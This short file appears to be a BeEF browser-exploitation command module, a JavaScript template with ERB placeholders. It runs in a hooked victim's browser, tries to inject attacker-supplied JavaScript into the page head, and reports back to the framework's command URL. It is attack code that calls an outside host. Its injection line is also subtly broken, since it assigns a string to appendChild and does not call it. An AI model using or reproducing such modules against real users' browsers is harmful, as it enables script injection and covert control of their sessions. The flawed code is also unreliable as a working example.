beef.execute(function() {
	document.head.appendChild = "<%= @javascript_inject %>";
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Inserted: <%= @javascript_inject %>');
})